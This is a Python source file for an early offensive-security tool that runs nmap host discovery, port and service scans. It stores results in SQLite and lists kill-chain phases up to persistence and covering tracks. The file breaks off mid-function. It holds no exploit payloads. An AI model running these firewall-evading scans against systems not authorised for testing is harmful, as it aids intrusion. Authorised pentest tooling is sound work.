#!/usr/bin/env python3
"""pshunter — guided offensive workflow runner (skeleton).

A phase-driven companion for pentest / CTF work: it walks a target through the
classic kill-chain stages — host discovery, port enumeration, service detection,
vulnerability scanning, CVE lookup and service exploitation — one deliberate step
at a time. Every phase records what it found so the operator can review progress
via [s] status and browse results via [d] database.

This file is an early skeleton: it draws the banner, lays out the menu and routes
the user's choice to placeholder handlers. The real engines (nmap wrappers, the
SQLite store and the qtermwidget shell-spawning) are intentionally not wired yet.

Authorised use only. Run pshunter exclusively against assets you own or are
explicitly permitted to test.
"""

from __future__ import annotations

import atexit
import ipaddress
import json
import os
import random
import re
import shlex
import shutil
import sqlite3
import subprocess
import sys
import tempfile
import threading
import time
from datetime import datetime


# ── terminal colours ──────────────────────────────────────────────────────────
# Auto-disabled when output is not a TTY or NO_COLOR is set, so piping stays clean.
_COLOR = sys.stdout.isatty() and os.environ.get("NO_COLOR") is None


def _c(code: str) -> str:
    return code if _COLOR else ""


RESET   = _c("\033[0m")
BOLD    = _c("\033[1m")
DIM     = _c("\033[2m")
CYAN    = _c("\033[36m")
GREEN   = _c("\033[32m")
RED     = _c("\033[31m")
YELLOW  = _c("\033[33m")
MAGENTA = _c("\033[35m")
BROWN   = _c("\033[38;2;205;133;63m")   # 24-bit brown (peru) for the options hint line


APP_NAME    = "pshunter"
APP_TAGLINE = "modular offensive security toolkit"
APP_VERSION = "1.0"


# ── banner ────────────────────────────────────────────────────────────────────
def _fallback_banner() -> str:
    """Hand-drawn banner used when pyfiglet is unavailable."""
    return r"""
           _                 _
 _ __  ___| |__  _   _ _ __ | |_ ___ _ __
| '_ \/ __| '_ \| | | | '_ \| __/ _ \ '__|
| |_) \__ \ | | | |_| | | | | ||  __/ |
| .__/|___/_| |_|\__,_|_| |_|\__\___|_|
|_|
"""


def render_banner() -> str:
    """ASCII-art app name. Prefers pyfiglet (ansi_shadow), falls back to a static
    banner so the tool still runs without the dependency."""
    try:
        from pyfiglet import Figlet
        return Figlet(font="ansi_shadow", width=200).renderText(APP_NAME).rstrip("\n")
    except Exception:
        return _fallback_banner().rstrip("\n")


def print_header() -> None:
    print(CYAN + BOLD + render_banner() + RESET)
    print()
    print(f"{DIM}  {APP_TAGLINE} · v{APP_VERSION}{RESET}")
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        print(f"{YELLOW}  ⚠ unprivileged — running as a normal user{RESET}"
              f"{DIM} — press {RESET}{YELLOW}[u]{RESET}{DIM} upgrade{RESET}")
    else:
        print(f"{GREEN}  ● root — full scan capability (raw sockets){RESET}")
    print()


# ── phases (the offensive kill-chain, in order) ───────────────────────────────
# Each entry: (menu key, name, one-line intent). The order is the recommended
# progression; nothing forces it, but later phases build on earlier findings.
PHASES = [
    ("0", "Host discovery",       "find which hosts are alive on the target scope"),
    ("1", "Port enumeration",     "map open TCP/UDP ports on a live host"),
    ("2", "Service detection",    "fingerprint the service/version behind each port"),
    ("3", "Vuln scan",            "run vulnerability checks against detected services"),
    ("4", "CVE lookup",           "match service CPEs to known CVEs"),
    ("5", "Service exploitation", "attempt exploitation / access on a chosen service"),
    ("6", "Privilege Escalation", "escalate to root / SYSTEM on a compromised host"),
    ("7", "Persistence",          "maintain access on a compromised host"),
    ("8", "Covering Tracks",      "clean up artifacts after an authorised engagement"),
]
_PHASES = {key: (name, desc) for key, name, desc in PHASES}


# ── scan-time budget ──────────────────────────────────────────────────────────
MIN_MINUTES = 1        # floor
MAX_MINUTES = 1440     # ceiling: 24 h
DEFAULT_MINUTES = 10   # Enter accepts this


# ── navigation words (accepted at any sub-prompt) ─────────────────────────────
_BACK_WORDS = {"b", "back"}
_HELP_WORDS = {"h", "help", "?"}
_MENU_WORDS = {"m", "menu"}          # jump straight back to the main menu (any depth)


# ── menu ──────────────────────────────────────────────────────────────────────
def print_menu() -> None:
    print(f"  {DIM}workflow{RESET}")
    for key, name, desc in PHASES:
        print(f"  {CYAN}[{key}]{RESET} {BOLD}{name}{RESET}")
    print()
    print(f"  {DIM}actions{RESET}")
    print(f"  {CYAN}[s]{RESET} {BOLD}status{RESET}")
    print(f"  {CYAN}[d]{RESET} {BOLD}database{RESET}")
    print(f"  {CYAN}[c]{RESET} {BOLD}catalog{RESET}")
    print(f"  {CYAN}[n]{RESET} {BOLD}new session{RESET}")
    if not _is_root():
        print(f"  {CYAN}[u]{RESET} {BOLD}upgrade{RESET}")
    print(f"  {CYAN}[h]{RESET} {BOLD}help{RESET}")
    print()
    print(f"  {DIM}/exit  quit{RESET}")


# ── help ──────────────────────────────────────────────────────────────────────
def print_help() -> None:
    """Full usage — kept off the main screen so it stays clean."""
    print(f"\n{BOLD}{CYAN}pshunter — help{RESET}\n")

    print(f"{BOLD}Phases{RESET}")
    for key, name, desc in PHASES:
        print(f"  {CYAN}[{key}]{RESET} {BOLD}{name:<20}{RESET}{DIM} {desc}{RESET}")
    print()

    print(f"{BOLD}Host discovery — target formats{RESET}")
    print(f"  {DIM}192.168.1.0/24{RESET}             subnet in CIDR notation")
    print(f"  {DIM}192.168.1.0{RESET}                bare IP — assumed /24")
    print(f"  {DIM}192.168.1.10-192.168.1.40{RESET}  range, full end address")
    print(f"  {DIM}192.168.1.10-40{RESET}            range, end = last octet")
    print()

    print(f"{BOLD}Time budget{RESET}")
    print(f"  {DIM}minutes · Enter = {DEFAULT_MINUTES} · {MIN_MINUTES}–{MAX_MINUTES} (24 h){RESET}")
    print()

    print(f"{BOLD}Menu actions{RESET}")
    print(f"  {BOLD}status{RESET}     command history + state; {BOLD}v <n>{RESET} view command+output "
          f"in a new terminal, {BOLD}stop <n>{RESET} abort, {BOLD}c{RESET} clear finished")
    print(f"  {BOLD}database{RESET}   discovered hosts; type a number for its ports, "
          f"{BOLD}r <n>{RESET} remove, {BOLD}c{RESET} wipe all")
    print(f"  {DIM}           inside a host: {BOLD}[f]{RESET}{DIM} findings, {BOLD}[p]{RESET}{DIM} progress "
          f"(per-phase tracker — which phases ran and what's pending; a number runs one){RESET}")
    print(f"  {BOLD}catalog{RESET}    supported services in exploitation order (bold = wired "
          f"tools implemented); type a number to see that service's steps")
    print(f"  {BOLD}new session{RESET}  wipe the whole database (hosts + history) for a fresh start")
    print(f"  {BOLD}upgrade{RESET}      re-run under sudo for root (SYN/UDP scans); progress is kept")
    print()

    print(f"{BOLD}Navigation{RESET}")
    print(f"  {BOLD}h{RESET} / {BOLD}help{RESET} / {BOLD}?{RESET}   show this screen")
    print(f"  {BOLD}b{RESET} / {BOLD}back{RESET}       return to the menu")
    print(f"  {BOLD}/exit{RESET}          quit pshunter")
    print()


# ── input helper ──────────────────────────────────────────────────────────────
class _ExitApp(Exception):
    """Raised from any prompt when the user types /exit — quits the whole app."""


class _ToMenu(Exception):
    """Raised from any prompt when the user types m/menu — pops out of every nested view
    straight back to the main menu (the main loop catches it and just redraws the menu)."""


def _ask(label: str) -> "str | None":
    """Prompt for a line. Returns the stripped text, or None if the user aborts
    (Ctrl+C / EOF) — callers treat None as 'back to the menu'. Typing /exit anywhere
    raises _ExitApp (quit); m/menu raises _ToMenu (jump to the main menu)."""
    try:
        value = input(f"{BOLD}{label}{RESET} ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return None
    low = value.lower()
    if low in ("/exit", "\\exit"):
        raise _ExitApp
    if low in _MENU_WORDS:
        raise _ToMenu
    return value


def _ctx_ask(module: str, options: str = "") -> "str | None":
    """Prompt tagged with the module you're in (coloured, for readability) and, one
    line above, a short hint of what you can type — tinted brown so it reads as
    interactive options, distinct from normal output."""
    if options:
        print(f"  {BROWN}{options}{RESET}")
    return _ask(f"{CYAN}[{module}]{RESET}{DIM} ›{RESET}")


def _hr() -> None:
    """Thin divider used inside interactive views to separate one chosen action's
    output from the next."""
    print(f"{DIM}{'─' * 56}{RESET}")


# ── host discovery (phase 1) ──────────────────────────────────────────────────
# A range wider than this is refused for expansion — use CIDR instead (nmap can
# only express an arbitrary start-end as a single token when the hosts share the
# same /24; otherwise we would have to hand nmap a huge explicit target list).
_MAX_RANGE_EXPAND = 8192


def parse_discovery_target(value: str) -> "tuple[bool, str, dict]":
    """Validate a host-discovery scope. Accepts a CIDR subnet, a bare IP (taken as
    /24), or an inclusive range ``start-end`` where ``end`` is either a full IPv4
    address or just the final octet. Returns ``(ok, error, parsed)`` where, on
    success, ``parsed = {"scope": <str>, "hosts": <int>, "targets": [<nmap arg>…]}``.
    """
    value = value.strip()
    if not value:
        return False, "empty — give a subnet or range", {}

    if "-" in value:                                   # start-end range (IPv4)
        left, _, right = value.partition("-")
        try:
            start = ipaddress.ip_address(left.strip())
        except ValueError:
            return False, "range start is not a valid IPv4 address", {}
        if start.version != 4:
            return False, "ranges are IPv4 only", {}
        right = right.strip()
        if "." in right:
            try:
                end = ipaddress.ip_address(right)
            except ValueError:
                return False, "range end is not a valid IPv4 address", {}
        elif right.isdigit() and 0 <= int(right) <= 255:
            end = ipaddress.ip_address((int(start) & 0xFFFFFF00) | int(right))
        else:
            return False, "range end must be an IP or a 0-255 octet", {}
        if int(end) < int(start):
            return False, "range end is before its start", {}
        hosts = int(end) - int(start) + 1
        if int(start) >> 8 == int(end) >> 8:           # same /24 -> compact nmap token
            targets = [f"{str(start).rsplit('.', 1)[0]}.{int(start) & 0xFF}-{int(end) & 0xFF}"]
        elif hosts <= _MAX_RANGE_EXPAND:               # spans /24s -> explicit list
            targets = [str(ipaddress.ip_address(i)) for i in range(int(start), int(end) + 1)]
        else:
            return False, "range too large — use CIDR notation", {}
        return True, "", {"scope": f"{start}-{end}", "hosts": hosts, "targets": targets}

    if "/" not in value:                               # bare IP -> assume a mask
        try:
            addr = ipaddress.ip_address(value)
        except ValueError:
            return False, "not a valid IP address", {}
        value = f"{value}/{24 if addr.version == 4 else 64}"

    try:
        net = ipaddress.ip_network(value, strict=False)
    except ValueError:
        return False, "not a valid subnet (CIDR)", {}
    return True, "", {"scope": str(net), "hosts": net.num_addresses, "targets": [str(net)]}


def _prompt_minutes(module: str, title: str, detail: str) -> "int | None":
    """Show a one-line summary (title + detail + default time) and read the time
    budget. Enter accepts the default; a number is validated to 1–1440."""
    print(f"\n{GREEN}✓{RESET} {BOLD}{title}{RESET} · {detail} · {DIM}⏱ {DEFAULT_MINUTES}m{RESET}")
    while True:
        v = _ctx_ask(module, f"<minutes {MIN_MINUTES}-{MAX_MINUTES}, Enter={DEFAULT_MINUTES}> · [h] help · [b] back · [m] menu")
        if v is None or v.lower() in _BACK_WORDS:
            return None
        if v.lower() in _HELP_WORDS:
            print_help()
            continue
        if v == "":
            return DEFAULT_MINUTES
        if v.isdigit() and MIN_MINUTES <= int(v) <= MAX_MINUTES:
            return int(v)
        print(f"{RED}✗ 1–{MAX_MINUTES} minutes{RESET}")


def _handle_host_discovery() -> None:
    """Phase 1 flow: read + validate the scope, then the time, then launch."""
    while True:
        value = _ctx_ask("discovery", "<subnet / range> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        ok, err, parsed = parse_discovery_target(value)
        if not ok:
            print(f"{RED}✗ {err}{RESET}")
            continue
        minutes = _prompt_minutes("discovery", "Host discovery",
                                  f"{parsed['scope']} · {parsed['hosts']} host(s)")
        if minutes is None:
            return
        _start_discovery(parsed, minutes)
        print(f"\n{GREEN}▶ host discovery running in the background{RESET} "
              f"{DIM}({parsed['scope']}, ⏱ {minutes}m) — check {BOLD}[s] status{RESET}")
        return


def _handle_port_enum() -> None:
    """Phase 2 flow: read + validate a single target IP, then the time, then launch
    the concurrent port scans."""
    while True:
        value = _ctx_ask("ports", "<single IP> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        try:
            ip = str(ipaddress.ip_address(value))
        except ValueError:
            print(f"{RED}✗ give one valid IP address{RESET}")
            continue
        minutes = _prompt_minutes("ports", "Port enumeration", ip)
        if minutes is None:
            return
        _start_port_enum(ip, minutes)
        print(f"\n{GREEN}▶ port enumeration running in the background{RESET} "
              f"{DIM}({ip} · fast + full TCP + UDP, ⏱ {minutes}m) — check {BOLD}[s] status{RESET}")
        return


def _handle_service_detection() -> None:
    """Phase 3 flow: read a target IP, then the time, then launch -sV -sC (+ OS) on the
    open ports discovered in phase 2."""
    while True:
        value = _ctx_ask("service", "<single IP> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        try:
            ip = str(ipaddress.ip_address(value))
        except ValueError:
            print(f"{RED}✗ give one valid IP address{RESET}")
            continue
        if not fetch_ports(ip):
            print(f"{DIM}note: no open ports recorded for {ip} — run {BOLD}[1] Port "
                  f"enumeration{RESET}{DIM} first (OS scan still runs if root){RESET}")
        minutes = _prompt_minutes("service", "Service detection", ip)
        if minutes is None:
            return
        _start_service_detection(ip, minutes)
        print(f"\n{GREEN}▶ service detection running in the background{RESET} "
              f"{DIM}({ip} · -sV -sC + OS, ⏱ {minutes}m) — check {BOLD}[s] status{RESET}")
        return


def _handle_vuln_scan() -> None:
    """Phase 4 flow: read a target IP, then the time, then launch targeted vuln/auth
    NSE scans mapped to the host's detected services."""
    while True:
        value = _ctx_ask("vuln", "<single IP> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        try:
            ip = str(ipaddress.ip_address(value))
        except ValueError:
            print(f"{RED}✗ give one valid IP address{RESET}")
            continue
        if not fetch_ports(ip):
            print(f"{DIM}note: no open ports recorded for {ip} — run {BOLD}[1] Port "
                  f"enumeration{RESET}{DIM} (and {BOLD}[2] Service detection{RESET}{DIM}) first{RESET}")
            continue
        print(f"{DIM}vuln + auth scripting{RESET}")
        minutes = _prompt_minutes("vuln", "Vuln scan", ip)
        if minutes is None:
            return
        _start_vuln_scan(ip, minutes)
        print(f"\n{GREEN}▶ vuln scan running in the background{RESET} "
              f"{DIM}({ip} · targeted NSE vuln+auth, ⏱ {minutes}m) — check {BOLD}[s] status{RESET}")
        return


# ── host-discovery nmap engine ────────────────────────────────────────────────
# Two passes, per OSCP/HTB practice. Pass 1 is a fast default sweep: as root, -sn
# already fires ICMP echo + TCP SYN 443 + TCP ACK 80 + ICMP timestamp, and ARP on
# a local segment — this catches the easy, responsive hosts quickly. Pass 2 is a
# thorough multi-probe sweep for hosts that drop the common probes: extra ICMP
# types plus TCP SYN/ACK and UDP probes across the ports firewalls usually let
# through (web/DNS/SMB/RDP/SNMP). Sent in parallel so at least one gets through.
# Both use -n (no DNS) for speed; results from the two passes are unioned.
_DISCOVERY_FAST = ["-sn", "-n", "-T4", "--max-retries", "1"]
_DISCOVERY_SLOW = [
    "-sn", "-n", "-T3",
    "-PE", "-PP", "-PM",                                     # ICMP echo / timestamp / netmask
    "-PS21,22,23,25,53,80,110,139,443,445,3389,8080",       # TCP SYN to common open ports
    "-PA80,443,3389",                                        # TCP ACK (bypass stateless SYN blocks)
    "-PU53,161,137",                                         # UDP to DNS / SNMP / NetBIOS
]


def _safe_unlink(path: str) -> None:
    try:
        os.unlink(path)
    except OSError:
        pass


def _host_from_elem(elem) -> "dict | None":
    """Build an up-host dict from one nmap ``<host>`` XML element (no ports: -sn)."""
    st = elem.find("status")
    if st is None or st.get("state") != "up":
        return None
    ip = mac = vendor = hostname = None
    for addr in elem.findall("address"):
        kind = addr.get("addrtype")
        if kind == "ipv4":
            ip = addr.get("addr")
        elif kind == "mac":
            mac, vendor = addr.get("addr"), addr.get("vendor")
    if not ip:
        return None
    hn = elem.find("hostnames/hostname")
    if hn is not None:
        hostname = hn.get("name")
    return {"ip": ip, "mac": mac, "vendor": vendor, "hostname": hostname}


def _host_ports_from_elem(elem) -> "dict | None":
    """Extract open (or open|filtered) ports from one nmap ``<host>`` element. Each
    port keeps its state and, when present, nmap's service guess (name/product/
    version) — filled in properly later by the service-detection phase."""
    ip = None
    for addr in elem.findall("address"):
        if addr.get("addrtype") == "ipv4":
            ip = addr.get("addr")
    if not ip:
        return None
    rows = []
    for port in elem.findall("ports/port"):
        pstate = port.find("state")
        state = pstate.get("state") if pstate is not None else None
        if state not in ("open", "open|filtered"):
            continue
        svc = port.find("service")
        service = None
        if svc is not None:
            service = {"name": svc.get("name"), "product": svc.get("product"),
                       "version": svc.get("version")}
        rows.append({"port": int(port.get("portid")), "proto": port.get("protocol") or "tcp",
                     "state": state, "service": service})
    return {"ip": ip, "ports": rows} if rows else None


def _host_detail_from_elem(elem) -> "dict | None":
    """Extract service-detection results from one nmap ``<host>`` element: probed
    services (name/product/version/cpe), NSE (-sC) script output per port (plus any
    host-level scripts under port 0), and the best OS match."""
    ip = None
    for addr in elem.findall("address"):
        if addr.get("addrtype") == "ipv4":
            ip = addr.get("addr")
    if not ip:
        return None
    services, scripts, hostnames = [], [], []
    for port in elem.findall("ports/port"):
        portid = int(port.get("portid"))
        proto = port.get("protocol") or "tcp"
        svc = port.find("service")
        if svc is not None and svc.get("method") == "probed":
            cpe = None
            for c in svc.findall("cpe"):
                txt = (c.text or "").strip()
                if txt and (cpe is None or txt.startswith("cpe:/a")):
                    cpe = txt                       # prefer the application CPE
            services.append({"port": portid, "proto": proto, "name": svc.get("name"),
                             "product": svc.get("product"), "version": svc.get("version"),
                             "cpe": cpe})
            if svc.get("hostname"):                 # nmap resolves a name (often the TLS cert CN)
                hostnames.append({"port": portid, "hostname": svc.get("hostname"), "source": "service"})
        for scr in port.findall("script"):
            scripts.append({"port": portid, "proto": proto,
                            "id": scr.get("id"), "output": scr.get("output")})
    for scr in elem.findall("hostscript/script"):   # host-level scripts (port 0)
        scripts.append({"port": 0, "proto": "", "id": scr.get("id"),
                        "output": scr.get("output")})
    om = elem.find("os/osmatch")
    os_name = om.get("name") if om is not None else None
    if not (services or scripts or os_name):
        return None
    return {"ip": ip, "services": services, "scripts": scripts, "os": os_name,
            "hostnames": hostnames}


def _run_nmap(args: list, targets: list, on_items, deadline: "float | None" = None,
              should_stop=None, parse_elem=None):
    """Run nmap (XML to a temp file), tail it with an incremental parser and hand each
    parsed ``<host>`` element to ``on_items`` as it appears. ``parse_elem`` turns an
    element into an item (defaults to the host parser for -sn; the port parser is used
    for port scans). XML feeds the parser; nmap's normal stdout is captured separately
    (for the report terminal). Returns ``(items, output_text)``, or ``(None, None)`` if
    nmap is missing. ``deadline`` hard-caps the run; ``should_stop`` is polled each tick
    to kill it early. Whatever streamed so far is kept."""
    parse_elem = parse_elem or _host_from_elem
    import xml.etree.ElementTree as ET
    tmp = tempfile.NamedTemporaryFile(prefix="pshunter_", suffix=".xml", delete=False)
    tmp.close()
    out = tempfile.NamedTemporaryFile(prefix="pshunter_out_", suffix=".txt", delete=False)
    full = ["nmap", "-oX", tmp.name] + args + targets
    try:
        proc = subprocess.Popen(full, stdout=out, stderr=subprocess.STDOUT,
                                stdin=subprocess.DEVNULL, start_new_session=True)
    except FileNotFoundError:
        out.close()
        _safe_unlink(tmp.name)
        _safe_unlink(out.name)
        return None, None
    out.close()

    parser = ET.XMLPullParser(("end",))
    all_items, pending, pos = [], [], 0
    start = time.time()

    def _flush():
        if pending:
            on_items(list(pending))
            all_items.extend(pending)
            pending.clear()

    def _consume():
        nonlocal pos
        try:
            with open(tmp.name, "rb") as fh:
                fh.seek(pos)
                chunk = fh.read()
                pos = fh.tell()
        except OSError:
            chunk = b""
        if chunk:
            try:
                parser.feed(chunk)
            except ET.ParseError:
                pass
            for _ev, elem in parser.read_events():
                if elem.tag == "host":
                    item = parse_elem(elem)
                    if item:
                        pending.append(item)
                    elem.clear()
        return chunk

    try:
        while True:
            alive = proc.poll() is None
            chunk = _consume()
            if len(pending) >= 8:
                _flush()
            if not alive and not chunk:
                break
            timed_out = deadline is not None and (time.time() - start) > deadline
            if timed_out or (should_stop is not None and should_stop()):
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
                _consume()
                break
            if alive:
                time.sleep(0.4)
        _flush()
    finally:
        _safe_unlink(tmp.name)
    try:
        with open(out.name, "r", encoding="utf-8", errors="replace") as fh:
            output = fh.read()
    except OSError:
        output = ""
    _safe_unlink(out.name)
    return all_items, output


# ── self-IP guard (never record loopback / the scanner's own address) ─────────
_OWN_ADDRS: "set | None" = None


def _own_addresses() -> set:
    """This machine's interface IPs, computed once and cached."""
    global _OWN_ADDRS
    if _OWN_ADDRS is None:
        addrs: set = set()
        try:
            out = subprocess.run(["ip", "-o", "addr", "show"], capture_output=True,
                                 text=True, timeout=10, stdin=subprocess.DEVNULL).stdout
            for line in out.splitlines():
                parts = line.split()
                for i, tok in enumerate(parts):
                    if tok in ("inet", "inet6") and i + 1 < len(parts):
                        addrs.add(parts[i + 1].split("/")[0])
        except (OSError, subprocess.SubprocessError):
            pass
        _OWN_ADDRS = addrs
    return _OWN_ADDRS


def _refresh_own_addresses() -> None:
    """Force the own-address cache to be recomputed (call at every scan start so a
    mid-session IP change — e.g. connecting a VPN — is reflected in the guard)."""
    global _OWN_ADDRS
    _OWN_ADDRS = None
    _own_addresses()


def _is_self_ip(ip: str) -> bool:
    """True for loopback or one of this machine's own interface addresses."""
    try:
        if ipaddress.ip_address(ip).is_loopback:
            return True
    except ValueError:
        return False
    return ip in _own_addresses()


# ── database (discovered hosts) ───────────────────────────────────────────────
# This script lives in appdata/terminal_modules/; keep the runtime DB up in appdata/
# (a data location) rather than next to the code.
DB_PATH = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "pshunter.db")
# Offline CPE→CVE index (built by the installer from NVD; see build_cve_index). Read-only.
CVE_INDEX_PATH = os.path.join(os.path.dirname(DB_PATH), "cve_index.db")
# CISA Known Exploited Vulnerabilities — CVE ids actually exploited in the wild. Bundled
# text file (one CVE per line); used to surface KEV matches first in the findings view.
KEV_PATH = os.path.join(os.path.dirname(DB_PATH), "kev.txt")
_KEV_CACHE: "set | None" = None


def _load_kev() -> set:
    """The set of CISA KEV CVE ids (cached). Empty if the file is missing."""
    global _KEV_CACHE
    if _KEV_CACHE is None:
        kev = set()
        try:
            with open(KEV_PATH, encoding="utf-8") as fh:
                for line in fh:
                    line = line.strip()
                    if line.startswith("CVE-"):
                        kev.add(line)
        except OSError:
            pass
        _KEV_CACHE = kev
    return _KEV_CACHE
_DB_LOCK = threading.Lock()
_SCHEMA = """
CREATE TABLE IF NOT EXISTS hosts (
    ip          TEXT PRIMARY KEY,
    mac         TEXT,
    vendor      TEXT,
    hostname    TEXT,
    os          TEXT,
    first_seen  TEXT,
    last_seen   TEXT
);
CREATE TABLE IF NOT EXISTS jobs (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    created     TEXT,
    phase       TEXT,
    name        TEXT,
    command     TEXT,
    state       TEXT,
    hosts       INTEGER,
    error       TEXT,
    output      TEXT,
    run         TEXT
);
CREATE TABLE IF NOT EXISTS ports (
    ip          TEXT,
    port        INTEGER,
    proto       TEXT,
    state       TEXT,
    first_seen  TEXT,
    last_seen   TEXT,
    source      TEXT,
    PRIMARY KEY (ip, port, proto)
);
CREATE TABLE IF NOT EXISTS services (
    ip          TEXT,
    port        INTEGER,
    proto       TEXT,
    name        TEXT,
    product     TEXT,
    version     TEXT,
    cpe         TEXT,
    first_seen  TEXT,
    last_seen   TEXT,
    source      TEXT,
    PRIMARY KEY (ip, port, proto)
);
CREATE TABLE IF NOT EXISTS scripts (
    ip          TEXT,
    port        INTEGER,
    proto       TEXT,
    script      TEXT,
    output      TEXT,
    first_seen  TEXT,
    last_seen   TEXT,
    PRIMARY KEY (ip, port, proto, script)
);
CREATE TABLE IF NOT EXISTS vulns (
    ip          TEXT,
    port        INTEGER,
    proto       TEXT,
    script      TEXT,
    state       TEXT,
    cve         TEXT,
    risk        TEXT,
    summary     TEXT,
    first_seen  TEXT,
    last_seen   TEXT,
    PRIMARY KEY (ip, port, proto, script)
);
CREATE TABLE IF NOT EXISTS exploit_steps (
    ip          TEXT,
    port        INTEGER,
    proto       TEXT,
    service     TEXT,
    step        INTEGER,
    status      TEXT,
    last_seen   TEXT,
    PRIMARY KEY (ip, port, proto, service, step)
);
CREATE TABLE IF NOT EXISTS hostnames (
    ip          TEXT,
    port        INTEGER,
    hostname    TEXT,
    source      TEXT,
    first_seen  TEXT,
    last_seen   TEXT,
    PRIMARY KEY (ip, hostname)
);
CREATE TABLE IF NOT EXISTS spawn_commands (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    command     TEXT NOT NULL,
    created     TEXT
);
"""


def _chown_db_to_user() -> None:
    """When running as root via sudo, hand the DB and its WAL sidecar files back to the
    invoking user (SUDO_UID/GID). Called on every connection so ownership is kept
    correct continuously — surviving a crash / SIGKILL / terminal close, unlike an
    exit-time fixup. No-op when not root or not launched through sudo."""
    if not (hasattr(os, "geteuid") and os.geteuid() == 0):
        return
    uid = os.environ.get("SUDO_UID")
    if not uid:
        return
    try:
        uid, gid = int(uid), int(os.environ.get("SUDO_GID") or uid)
    except ValueError:
        return
    for suffix in ("", "-wal", "-shm"):          # SQLite WAL keeps two sidecar files
        path = DB_PATH + suffix
        if os.path.exists(path):
            try:
                os.chown(path, uid, gid)
            except OSError:
                pass


def _db_connect() -> "sqlite3.Connection":
    conn = sqlite3.connect(DB_PATH, timeout=30)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.executescript(_SCHEMA)
    # Migrate pre-existing tables that predate a column (IF NOT EXISTS above won't
    # alter an existing table).
    jcols = {r[1] for r in conn.execute("PRAGMA table_info(jobs)").fetchall()}
    if jcols and "output" not in jcols:
        conn.execute("ALTER TABLE jobs ADD COLUMN output TEXT")
    if jcols and "run" not in jcols:
        conn.execute("ALTER TABLE jobs ADD COLUMN run TEXT")
    hcols = {r[1] for r in conn.execute("PRAGMA table_info(hosts)").fetchall()}
    if hcols and "os" not in hcols:
        conn.execute("ALTER TABLE hosts ADD COLUMN os TEXT")
    for tbl in ("ports", "services"):            # source: NULL = scanned, 'manual' = user-entered
        cols = {r[1] for r in conn.execute(f"PRAGMA table_info({tbl})").fetchall()}
        if cols and "source" not in cols:
            conn.execute(f"ALTER TABLE {tbl} ADD COLUMN source TEXT")
    conn.commit()
    _chown_db_to_user()          # keep the DB user-owned even while running as root
    return conn


def save_hosts(hosts: list) -> int:
    """Upsert discovered hosts by IP; keeps first non-null mac/vendor/hostname/os."""
    if not hosts:
        return 0
    now = datetime.now().isoformat(timespec="seconds")
    saved = 0
    with _DB_LOCK:
        conn = _db_connect()
        try:
            for h in hosts:
                ip = h.get("ip")
                if not ip or _is_self_ip(ip):       # never store loopback / own address
                    continue
                conn.execute(
                    "INSERT INTO hosts (ip, mac, vendor, hostname, os, first_seen, last_seen) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?) "
                    "ON CONFLICT(ip) DO UPDATE SET "
                    "  mac       = COALESCE(excluded.mac, mac), "
                    "  vendor    = COALESCE(excluded.vendor, vendor), "
                    "  hostname  = COALESCE(excluded.hostname, hostname), "
                    "  os        = COALESCE(excluded.os, os), "
                    "  last_seen = excluded.last_seen",
                    (ip, h.get("mac"), h.get("vendor"), h.get("hostname"), h.get("os"), now, now),
                )
                saved += 1
            conn.commit()
        finally:
            conn.close()
    return saved


def fetch_hosts() -> list:
    """(ip, mac, vendor, hostname, os, nports) rows, sorted by IP; nports is the count
    of open ports recorded for the host. [] if the DB is empty."""
    if not os.path.exists(DB_PATH):
        return []
    conn = sqlite3.connect(DB_PATH, timeout=30)
    try:
        rows = conn.execute(
            "SELECT h.ip, h.mac, h.vendor, h.hostname, h.os, "
            "  (SELECT COUNT(*) FROM ports p WHERE p.ip = h.ip) "
            "FROM hosts h").fetchall()
    except sqlite3.OperationalError:      # file exists but schema not created yet
        return []
    finally:
        conn.close()

    def _key(row):
        try:
            return (0, int(ipaddress.ip_address(row[0])))
        except ValueError:
            return (1, 0)
    rows.sort(key=_key)
    return rows


def save_ports(ip: str, rows: list, source: "str | None" = None) -> int:
    """Upsert open ports for a host by (ip, port, proto). When a scan carried a service
    guess (nmap's port->name table, or -sV later), it's upserted into the services
    table too — kept non-null so the service-detection phase only enriches it.
    ``source='manual'`` tags user-entered rows; a scanned upsert (source=None) never
    clears an existing tag (COALESCE), so a manual row stays flagged for removal."""
    if not ip or not rows or _is_self_ip(ip):
        return 0
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            for r in rows:
                conn.execute(
                    "INSERT INTO ports (ip, port, proto, state, first_seen, last_seen, source) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?) "
                    "ON CONFLICT(ip, port, proto) DO UPDATE SET "
                    "  state = excluded.state, last_seen = excluded.last_seen, "
                    "  source = COALESCE(excluded.source, source)",
                    (ip, r["port"], r["proto"], r.get("state"), now, now, source),
                )
                svc = r.get("service") or {}
                if svc.get("name") or svc.get("product") or svc.get("version"):
                    conn.execute(
                        "INSERT INTO services (ip, port, proto, name, product, version, cpe, "
                        "first_seen, last_seen, source) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?) "
                        "ON CONFLICT(ip, port, proto) DO UPDATE SET "
                        "  name     = COALESCE(excluded.name, name), "
                        "  product  = COALESCE(excluded.product, product), "
                        "  version  = COALESCE(excluded.version, version), "
                        "  last_seen = excluded.last_seen, "
                        "  source   = COALESCE(excluded.source, source)",
                        (ip, r["port"], r["proto"], svc.get("name"), svc.get("product"),
                         svc.get("version"), None, now, now, source),
                    )
            conn.commit()
        finally:
            conn.close()
    return len(rows)


def _fetch(query: str, params: tuple) -> list:
    """Run a read query, returning [] if the DB/table isn't there yet."""
    if not os.path.exists(DB_PATH):
        return []
